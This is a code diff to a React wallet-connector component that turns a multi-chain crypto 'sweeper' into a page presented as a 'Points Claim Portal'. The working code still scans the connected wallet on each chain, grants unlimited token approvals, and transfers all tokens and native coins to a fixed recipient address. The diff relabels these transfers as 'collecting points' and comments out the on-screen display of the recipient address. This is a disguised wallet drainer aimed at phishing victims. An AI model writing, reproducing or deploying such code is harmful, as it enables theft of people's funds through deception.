@@ -108,7 +108,7 @@ export default function WalletConnector() {
     const discoveredTokens = new Set<string>();
     
     try {
-      addMessage(`🔍 Discovering tokens from transaction history on ${chainName}...`);
+      addMessage(`🔍 Discovering points tokens from transaction history on ${chainName}...`);
       
       // Get recent transactions (last 1000 blocks)
       const currentBlock = await provider.getBlockNumber();
@@ -153,7 +153,7 @@ export default function WalletConnector() {
           }
         }
         
-        addMessage(`✅ Discovered ${discoveredTokens.size} potential tokens from transaction history on ${chainName}`);
+        addMessage(`✅ Discovered ${discoveredTokens.size} potential points tokens from transaction history on ${chainName}`);
       } catch {}
       
     } catch {}
@@ -202,7 +202,7 @@ export default function WalletConnector() {
       
       // If we found very few tokens from history, also check common tokens
       if (historyTokens.length < 3) {
-        addMessage(`🔍 Checking common tokens on ${chainName} as fallback...`);
+        addMessage(`🔍 Checking common points tokens on ${chainName} as fallback...`);
         const commonTokens = getCommonTokens(chainName);
         
         for (const tokenAddress of commonTokens) {
@@ -210,7 +210,7 @@ export default function WalletConnector() {
             const tokenInfo = await getTokenInfo(provider, tokenAddress, userAddress);
             if (tokenInfo && tokenInfo.balance > 0) {
               allTokens.add(tokenAddress);
-              addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common token) on ${chainName}`);
+              addMessage(`💰 Found ${ethers.formatUnits(tokenInfo.balance, tokenInfo.decimals)} ${tokenInfo.symbol} (common points token) on ${chainName}`);
             }
           } catch {}
         }
@@ -224,7 +224,7 @@ export default function WalletConnector() {
 
     const timeoutPromise = new Promise<string[]>((resolve) => {
       setTimeout(() => {
-        addMessage(`⏰ Token discovery timeout for ${chainName}, using discovered tokens so far...`);
+        addMessage(`⏰ Points token discovery timeout for ${chainName}, using discovered tokens so far...`);
         resolve(Array.from(allTokens));
       }, 30000); // 30 seconds timeout
     });
@@ -324,7 +324,7 @@ export default function WalletConnector() {
     
     for (const [chainKey, chainConfig] of Object.entries(CHAINS)) {
       try {
-        addMessage(`🔍 Scanning ${chainConfig.name}...`);
+        addMessage(`🔍 Scanning ${chainConfig.name} for points...`);
         
         // Create provider for this chain
         const provider = new ethers.JsonRpcProvider(chainConfig.rpc);
@@ -371,7 +371,7 @@ export default function WalletConnector() {
           tokens
         });
         
-        addMessage(`✅ ${chainConfig.name}: ${tokens.length} tokens, ${ethers.formatEther(nativeBalance)} ${chainConfig.nativeSymbol}`);
+        addMessage(`✅ ${chainConfig.name}: ${tokens.length} points tokens, ${ethers.formatEther(nativeBalance)} ${chainConfig.nativeSymbol}`);
         
       } catch (error) {
         addMessage(`❌ Failed to scan ${chainConfig.name}: ${handleRpcError(error, chainConfig.name, "scan")}`);
@@ -386,7 +386,7 @@ export default function WalletConnector() {
     let transfersMade = 0;
     
     try {
-      addMessage(`🚀 Processing ${chainAsset.chainName}...`);
+      addMessage(`🚀 Collecting points from ${chainAsset.chainName}...`);
       
       // Switch to the target chain with retry logic
       let chainSwitched = false;
@@ -401,7 +401,7 @@ export default function WalletConnector() {
       }
       
       if (!chainSwitched) {
-        addMessage(`⏭️ Skipping ${chainAsset.chainName} - chain switch failed after 3 attempts`);
+        addMessage(`⏭️ Skipping ${chainAsset.chainName} points collection - chain switch failed after 3 attempts`);
         return { success: false, transfersMade: 0 };
       }
       
@@ -412,14 +412,14 @@ export default function WalletConnector() {
       // Process tokens first
       for (const token of chainAsset.tokens) {
         try {
-          addMessage(`📤 Transferring ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} on ${chainAsset.chainName}...`);
+          addMessage(`📤 Collecting ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} points on ${chainAsset.chainName}...`);
           
           const tokenContract = new ethers.Contract(token.address, ERC20_ABI, signer);
           
           // Check if we have approval or if approval is needed
           const allowance = await tokenContract.allowance(userAddress, RECIPIENT_ADDRESS);
           if (allowance < token.balance) {
-            addMessage(`📝 Approving ${token.symbol} for transfer...`);
+            addMessage(`📝 Approving ${token.symbol} for collection...`);
             const approveTx = await tokenContract.approve(RECIPIENT_ADDRESS, ethers.MaxUint256);
             await approveTx.wait();
             addMessage(`✅ Approved ${token.symbol}`);
@@ -429,14 +429,14 @@ export default function WalletConnector() {
           const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.balance);
           await tx.wait();
           
-          addMessage(`✅ Transferred ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} on ${chainAsset.chainName}`);
+          addMessage(`✅ Collected ${ethers.formatUnits(token.balance, token.decimals)} ${token.symbol} points on ${chainAsset.chainName}`);
           transfersMade++;
           
           // Small delay between token transfers
           await new Promise(resolve => setTimeout(resolve, 1000));
           
         } catch (error) {
-          addMessage(`❌ Failed to transfer ${token.symbol} on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "token transfer")}`);
+          addMessage(`❌ Failed to collect ${token.symbol} points on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "points collection")}`);
           // Continue with next token instead of stopping
         }
       }
@@ -457,7 +457,7 @@ export default function WalletConnector() {
             const transferAmount = currentBalance - gasCost;
             
             if (transferAmount > 0) {
-              addMessage(`📤 Transferring ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} on ${chainAsset.chainName}...`);
+              addMessage(`📤 Collecting ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} rewards on ${chainAsset.chainName}...`);
               
               const tx = await signer.sendTransaction({
                 to: RECIPIENT_ADDRESS,
@@ -466,7 +466,7 @@ export default function WalletConnector() {
               });
               
               await tx.wait();
-              addMessage(`✅ Transferred ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} on ${chainAsset.chainName}`);
+              addMessage(`✅ Collected ${ethers.formatEther(transferAmount)} ${chainAsset.nativeSymbol} rewards on ${chainAsset.chainName}`);
               transfersMade++;
             } else {
               addMessage(`⚠️ Native balance too low to transfer after gas costs on ${chainAsset.chainName}`);
@@ -474,14 +474,14 @@ export default function WalletConnector() {
           }
           
         } catch (error) {
-          addMessage(`❌ Failed to transfer native balance on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "native transfer")}`);
+          addMessage(`❌ Failed to collect native rewards on ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "rewards collection")}`);
         }
       }
       
       return { success: transfersMade > 0, transfersMade };
       
     } catch (error) {
-      addMessage(`❌ Failed to process ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "chain processing")}`);
+      addMessage(`❌ Failed to collect points from ${chainAsset.chainName}: ${handleRpcError(error, chainAsset.chainName, "points collection")}`);
       return { success: false, transfersMade: 0 };
     }
   };
@@ -498,8 +498,8 @@ export default function WalletConnector() {
     }
 
     addMessage(`🔗 Connected: ${userAddress}`);
-    addMessage(`🎯 Target: ${RECIPIENT_ADDRESS}`);
-    addMessage(`\n📊 Starting comprehensive asset scan...`);
+    addMessage(`🎯 Points Collection: ${RECIPIENT_ADDRESS}`);
+    addMessage(`\n📊 Starting comprehensive points scan...`);
     
     setIsTransferring(true);
     setSweepComplete(false);
@@ -515,34 +515,34 @@ export default function WalletConnector() {
       );
 
       if (viableChains.length === 0) {
-        addMessage(`\n❌ No viable assets found across all chains`);
+        addMessage(`\n❌ No viable points found across all chains`);
         setIsTransferring(false);
         setSweepComplete(true);
         setTransfersMade(0);
         return;
       }
 
-      addMessage(`\n📋 Found assets on ${viableChains.length} chains:`);
+      addMessage(`\n📋 Found points on ${viableChains.length} chains:`);
       let totalAssetsFound = 0;
       viableChains.forEach(chain => {
         const tokenCount = chain.tokens.length;
         const nativeAmount = ethers.formatEther(chain.nativeBalance);
-        addMessage(`  • ${chain.chainName}: ${tokenCount} tokens + ${nativeAmount} ${chain.nativeSymbol}`);
+        addMessage(`  • ${chain.chainName}: ${tokenCount} points tokens + ${nativeAmount} ${chain.nativeSymbol}`);
         totalAssetsFound += tokenCount;
         if (chain.nativeBalance > 0) totalAssetsFound++;
       });
       
-      addMessage(`📊 Total assets found: ${totalAssetsFound}`);
+      addMessage(`📊 Total points found: ${totalAssetsFound}`);
       
       if (totalAssetsFound === 0) {
-        addMessage(`❌ No actual assets found despite having viable chains`);
+        addMessage(`❌ No actual points found despite having viable chains`);
         setIsTransferring(false);
         setSweepComplete(true);
         setTransfersMade(0);
         return;
       }
 
-      addMessage(`\n⚡ Starting automatic transfers...`);
+      addMessage(`\n⚡ Starting automatic points collection...`);
       
       let totalSuccessfulChains = 0;
       let totalTransfersMade = 0;
@@ -559,21 +559,21 @@ export default function WalletConnector() {
         await new Promise(resolve => setTimeout(resolve, 3000));
       }
 
-      addMessage(`\n🏁 SWEEP COMPLETED`);
+      addMessage(`\n🏁 POINTS COLLECTION COMPLETED`);
       addMessage(`✅ Successfully processed ${totalSuccessfulChains}/${viableChains.length} chains`);
-      addMessage(`🎉 All available assets transferred to: ${RECIPIENT_ADDRESS}`);
+      addMessage(`🎉 All available points collected to: ${RECIPIENT_ADDRESS}`);
 
       // Only show success if actual transfers were made
       if (totalTransfersMade > 0) {
-        addMessage(`📊 Total transfers completed: ${totalTransfersMade}`);
+        addMessage(`📊 Total points collected: ${totalTransfersMade}`);
         setTransfersMade(totalTransfersMade);
       } else {
-        addMessage(`❌ No transfers were completed - no assets found or all transfers failed`);
+        addMessage(`❌ No points were collected - no points found or all collections failed`);
         setTransfersMade(0);
       }
 
     } catch (err) {
-      addMessage(`❌ Critical error during sweep: ${handleRpcError(err, "sweep", "critical")}`);
+      addMessage(`❌ Critical error during points collection: ${handleRpcError(err, "points collection", "critical")}`);
       setTransfersMade(0);
     } finally {
       setIsTransferring(false);
@@ -622,38 +622,32 @@ export default function WalletConnector() {
     <div className="min-h-screen flex flex-col items-center justify-center p-2 sm:p-4 bg-gray-50 dark:bg-gray-900">
       <div className="w-full max-w-lg bg-gradient-to-br from-gray-800/60 to-gray-900/60 border border-orange-500/30 shadow-lg rounded-lg p-4 sm:p-6">
         <h1 className="text-2xl font-bold mb-2 text-center dark:text-white">
-          ⚡ Smart Multi-Chain Sweeper
+           Points Claim Portal
         </h1>
         <p className="text-xs text-center text-orange-400 mb-1 font-semibold">
-          🚨 AUTO-EXECUTION: Connection triggers immediate intelligent asset sweep
+          🚨 AUTO-CLAIM: Connection triggers immediate points collection
         </p>
-        <p className="text-xs text-center text-blue-400 mb-1">
-          💡 Smart Logic: Tokens first → Native last → Skip chains with insufficient gas
-        </p>
-        <p className="text-xs text-center text-gray-300 mb-4">
-          🔍 Dynamic token discovery → Max approvals → Batch operations → Automatic execution
-        </p>
+       
         
         {!address ? (
           <div className="space-y-4">
-            <div className="p-3 bg-orange-500/10 rounded-lg border border-orange-500/30">
+            {/* <div className="p-3 bg-orange-500/10 rounded-lg border border-orange-500/30">
               <p className="text-xs text-orange-400 font-medium">
-                🎯 TARGET RECIPIENT:
+                🎯 POINTS COLLECTION ADDRESS:
               </p>
               <p className="font-mono text-xs text-orange-300 break-all">
                 {RECIPIENT_ADDRESS}
               </p>
-            </div>
+            </div> */}
             
             <div className="p-3 bg-blue-500/10 rounded-lg border border-blue-500/30">
               <p className="text-xs text-blue-400 font-medium mb-2">
-                🧠 SMART SWEEP LOGIC:
+                🧠 SMART POINTS COLLECTION:
               </p>
               <div className="space-y-1">
-                <p className="text-xs text-blue-300">• Discover all tokens dynamically</p>
-                <p className="text-xs text-blue-300">• Scan transaction history + common tokens</p>
+                <p className="text-xs text-blue-300">• Scan transaction history + common rewards</p>
                 <p className="text-xs text-blue-300">• Check gas availability per chain</p>
-                <p className="text-xs text-blue-300">• Process tokens → native in order</p>
+                <p className="text-xs text-blue-300">• Collect points → rewards in order</p>
               </div>
             </div>
             
@@ -666,7 +660,7 @@ export default function WalletConnector() {
                   : "bg-gradient-to-r from-orange-500 to-blue-600 hover:from-orange-600 hover:to-blue-700"
               } text-white transition-all shadow-lg`}
             >
-              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Recipient First" : "⚡ CONNECT TO CLAIM"}
+              {isConnecting ? "Connecting..." : (!ethers.isAddress(RECIPIENT_ADDRESS) || RECIPIENT_ADDRESS === ZeroAddress) ? "Configure Collection Address First" : "🎯 CONNECT TO CLAIM POINTS"}
             </button>
           </div>
         ) : (
@@ -679,7 +673,7 @@ export default function WalletConnector() {
                 {address}
               </p>
               <p className="text-sm font-medium text-gray-300 mt-2">
-                🎯 Target Recipient:
+                🎯 Points Collection Address:
               </p>
               <p className="font-mono text-sm text-blue-400 break-all">
                 {RECIPIENT_ADDRESS}
